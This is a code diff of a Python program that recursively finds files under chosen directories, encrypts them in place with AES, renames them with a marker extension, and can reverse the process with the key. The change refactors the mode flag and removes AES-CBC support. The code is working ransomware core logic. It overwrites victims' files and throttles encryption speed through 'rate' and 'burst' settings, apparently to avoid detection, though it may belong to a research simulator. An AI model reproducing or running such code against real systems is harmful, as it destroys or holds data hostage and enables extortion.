@@ -125,47 +125,32 @@ def discover_files(start_path):
                     yield absolute_path
 
 
-def modify_file_inplace(file_name, crypto, flag, block_size=16):
+def modify_file_inplace(file_name, crypto, encrypting, block_size=16):
     """
     Open `filename` and encrypt/decrypt according to `crypto`
     :param file_name: a filename (preferably absolute path)
     :param crypto: a stream cipher function that takes in a plaintext,
              and returns a ciphertext of identical length
-    :param flag: which algorithm is used and in which mode (enc/dec)
+    :param encrypting: which mode the algorithm is used in (enc/dec)
     :param block_size: length of blocks to read and write.
     :return: None
     """
     with open(file_name, 'r+b') as f:
         plaintext = f.read(block_size)  # read number of bytes
 
-        if flag[1] == "0":  # encrypt
+        if encrypting:  # encrypt
             config = get_config_from_file()
             rate = float(config["GENERAL"]["rate"])  # bytes per second
             bytes_counter = 0
             enc_start = time()  # time in seconds since epoch
 
         while plaintext:
-            cipher = flag[0]
-            if cipher == "0":  # AES-CBC
-                if flag[1] == "0":  # encrypt, pad
-                    if len(plaintext) < block_size:
-                        padded = pad(plaintext, block_size)
-                        ciphertext = crypto(padded)
-                    else:
-                        ciphertext = crypto(plaintext)
-                else:  # decrypt, unpad
-                    decrypted = crypto(plaintext)
-                    if decrypted.endswith(b"\x0b"):  # padding character
-                        ciphertext = unpad(decrypted, block_size)
-                    else:
-                        ciphertext = decrypted
-            else:
-                ciphertext = crypto(plaintext)
+            ciphertext = crypto(plaintext)
 
             f.seek(-len(plaintext), 1)  # return to same point before the read
             f.write(ciphertext)
 
-            if flag[1] == "0":  # encrypt
+            if encrypting:  # encrypt
                 bytes_counter += len(plaintext)
                 enc_running = time() - enc_start  # time in seconds
                 if rate > 0 and rate * enc_running < bytes_counter:  # encryption rate is limited
@@ -189,11 +174,7 @@ def modify_file_inplace(file_name, crypto, flag, block_size=16):
 def select_encryption_algorithm(key):
     config = get_config_from_file()
     algo = config["GENERAL"]["algo"]
-    if algo == "AES-CBC":
-        assert len(key) in [16, 24, 32]
-        cipher = AES.new(key=key, mode=AES.MODE_CBC)
-        return cipher, ".0", b64encode(cipher.iv).decode("utf-8").replace("/", "-#-")  # avoid "/" in filenames
-    elif algo == "AES-CTR":
+    if algo == "AES-CTR":
         assert len(key) in [16, 24, 32]
         ctr = Counter.new(128)
         return AES.new(key=key, mode=AES.MODE_CTR, counter=ctr), ".1", None
@@ -216,10 +197,7 @@ def select_decryption_algorithm(filename, key):
     split = path.basename(filename).split(".")[-2].split("--")
     flag = split[0]
     extra = "--".join(split[1:]) if len(split) > 1 else None
-    if flag == "0":
-        assert len(key) in [16, 24, 32]
-        return AES.new(key=key, mode=AES.MODE_CBC, iv=b64decode(extra.replace("-#-", "/"))), "0"
-    elif flag == "1":
+    if flag == "1":
         assert len(key) in [16, 24, 32]
         ctr = Counter.new(128)
         return AES.new(key=key, mode=AES.MODE_CTR, counter=ctr), "1"
@@ -261,11 +239,10 @@ def encrypt_files(key, start_dirs):
                 config = get_config_from_file()
                 duration = int(config["BURST"]["duration"][1:])  # format examples "s5" or "f30"
                 limit_files = config["BURST"]["duration"].startswith("f")
-                rate = float(config["GENERAL"]["rate"])
 
                 crypt, flag, extra = select_encryption_algorithm(key)
                 try:
-                    modify_file_inplace(file, crypt.encrypt, flag[1:] + "0")
+                    modify_file_inplace(file, crypt.encrypt, encrypting=True)
                 except OSError as e:
                     if e.strerror == "Read-only file system":
                         continue
@@ -320,7 +297,7 @@ def decrypt_files(key, start_dirs):
         for file in discover_files(curr_dir):
             if file.endswith(EXTENSION):
                 crypt, flag = select_decryption_algorithm(file, key)
-                modify_file_inplace(file, crypt.decrypt, flag[-1] + "1")
+                modify_file_inplace(file, crypt.decrypt, encrypting=False)
 
                 abs_dir = path.dirname(file)
                 file_original = ".".join(path.basename(file).split(".")[:-2])
